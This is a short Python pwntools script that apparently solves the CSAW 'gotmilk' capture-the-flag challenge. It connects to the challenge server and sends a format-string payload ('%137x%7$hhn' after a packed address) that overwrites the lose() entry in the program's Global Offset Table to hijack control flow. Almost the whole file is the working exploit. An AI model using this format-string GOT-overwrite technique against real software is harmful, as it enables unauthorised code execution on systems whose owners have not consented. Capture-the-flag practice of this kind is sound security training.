from pwn import *

# Connect to remote
sh = remote("pwn.chal.csaw.io", 1004)

# For debugging
# sh = process("./gotmilk")
# gdb.attach(sh, "b *0x080486cf")

# opener
print(sh.recvline())
sh.recvline()
print(sh.recvline())

# format string

# modify the lose() entry on the GOT
lose_got_addr = p32(0x0804a010)
arguments = lose_got_addr
format_string = arguments + "%137x%7$hhn"
entry_addr = p32(0x080485f6)

# send payload
sh.sendline(format_string)

# get the result of the format string
output = sh.recvline()

print(output)
# lose_loc = u64(output.split(':')[2][0:8])
# print(hex(lose_loc))
print(sh.recvline())